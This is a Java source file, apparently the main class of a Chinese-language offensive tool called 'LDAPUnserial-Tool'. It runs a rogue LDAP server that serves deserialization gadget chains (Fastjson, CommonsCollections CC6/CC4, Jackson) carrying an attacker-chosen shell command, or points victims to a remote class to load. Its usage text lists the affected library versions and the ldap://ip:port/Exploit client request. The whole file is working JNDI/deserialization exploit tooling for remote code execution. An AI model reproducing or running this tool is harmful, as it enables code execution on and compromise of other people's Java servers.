package org.c3p0ooo;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import org.gadget.CC6;
import org.gadget.Fastjson;
import org.gadget.Jackson;
import org.interceptor.SerialOperationInterceptor;
import org.gadget.CC4;
import sun.misc.BASE64Decoder;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.FileInputStream;
import java.net.InetAddress;

public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) throws Exception {
        System.out.println(" 使用：");
        System.out.println("【1】LDAP反序列化方式：java -jar LDAPUnserial-Tool.jar LDAP端口 base64/file base64编码后的链/序列化文件路径");
        System.out.println("【2】请求实例化Class方式：java -jar LDAPUnserial-Tool.jar LDAP端口 class http://xxx.xxx.xxx.xxx:xx/x.class");
        System.out.println("【3】内置链：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget -h");
        System.out.println(" 客户端请求：ldap://ip:port/Exploit（名字随意）");
        System.out.println("------------------------------------------------------------------------");
        int ldap_port = Integer.valueOf(args[0]);
        String gadgetType = args[1];
        if(gadgetType.equals("base64")){
            String gadget = args[2];
            BASE64Decoder base64Decoder = new BASE64Decoder();
            byte[] decode = base64Decoder.decodeBuffer(gadget);
            lanuchLDAPServer(ldap_port, decode);
        }else if(gadgetType.equals("file")){
            FileInputStream fis = new FileInputStream(args[2]);
            byte[] bytes = new byte[fis.available()];
            fis.read(bytes);
            lanuchLDAPServer(ldap_port, bytes);
        }else if(gadgetType.equals("class")) {
            String url = args[2];
            lanuchLDAPServer(ldap_port, url);
        }else if(gadgetType.equals("gadget")){
            String gadgetName = "";
            String common = "";
            if(args.length >= 3) {gadgetName = args[2];}
            if(args.length >= 4) {
                common = args[3];
                if(common.startsWith("\"") && common.endsWith("\"")){
                    common = common.substring(1, common.length() - 1);
                }
                System.out.println("执行的命令为：" + common);
            }
            if(gadgetName.isEmpty() || gadgetName.equals("-h")){
                System.out.println("用法：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget fastjson \"命令\"(必须双引号)");
                System.out.println("目前支持的链：\nfastjson (影响版本：1.2.49-1.2.83)\n" +
                        "CC6 (影响版本：<= commons-collections 3.2.1)\n" +
                        "CC4 (影响版本：commons-collections4 4.0)\n" +
                        "jackson (影响版本：jackson-databind 2.10.0及以上版本)");
            }else if(common.isEmpty()){
                System.out.println("命令不能为空！");
            }else if(gadgetName.equals("fastjson")){
                byte[] bytes = Fastjson.getBytes(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else if(gadgetName.equals("CC6")){
                byte[] bytes = CC6.getBytes(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else if(gadgetName.equals("jackson")){
                byte[] bytes = Jackson.getBytes(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else if(gadgetName.equals("CC4")){
                byte[] bytes = CC4.getBytes(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else{
                System.out.println("暂不支持该链！");
            }
        }else {
            System.out.println("类型错误");
        }
    }


    public static void lanuchLDAPServer(Integer ldap_port, Object obj) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new SerialOperationInterceptor(obj));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
